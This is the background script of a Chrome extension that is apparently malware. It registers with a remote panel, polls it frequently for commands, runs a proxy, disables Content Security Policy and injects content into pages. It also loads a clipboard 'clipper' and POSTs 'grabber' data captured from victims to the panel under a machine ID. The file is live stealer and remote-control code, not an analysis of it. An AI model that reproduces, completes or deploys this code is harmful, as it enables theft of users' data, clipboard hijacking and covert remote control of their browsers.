import config from '../config.js';

import {initMachine} from "./functions/getMachineInfo.js";
import {getInjections} from "./functions/injections.js"
import {disableCSP} from "./functions/csp.js";
import {exchangeSettings} from "./functions/exchangeSettings.js";
import {getSettings} from "./functions/settings.js";
import {getCommands} from "./functions/commands.js";
import {checkConnection, setIsEnabled} from "./functions/proxy.js";
import {getClipperData} from "./functions/clipper.js";

const startAlarms = async () => {
    await chrome.alarms.clear("checkCommands");
    await chrome.alarms.clear("checkProxy");

    await chrome.alarms.create("checkCommands", {periodInMinutes: 0.3});
    await chrome.alarms.create("checkProxy", {periodInMinutes: 0.02});

    await chrome.alarms.onAlarm.addListener(async function (alarm) {
        if (alarm.name === "checkCommands") {
            getCommands()
        }

        if (alarm.name === "checkProxy") {
            checkConnection()
        }
    })
}

const init = async () => {
    const machine = await initMachine()

    if (machine.isEnabledProxy) {
        setIsEnabled(true)
    }

    getInjections()
    getCommands()
    getSettings()
    getClipperData()
}

chrome.storage.local.set({
    domain: config.panelUrl
})

init()

startAlarms()
disableCSP()
exchangeSettings()

chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
    const data = message.data

    const cacheUuid = await chrome.storage.local.get(['uuid'])
    const uuid = cacheUuid.uuid

    if (message.type === "new-grabber-info") {
        await fetch(`${config.panelUrl}/machine/set-grabber-info`, {
            method: 'POST',
            headers: {
                'Accept': 'application/json, application/xml, text/plain, text/html, *.*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                uuid,
                data
            })
        })
    }
});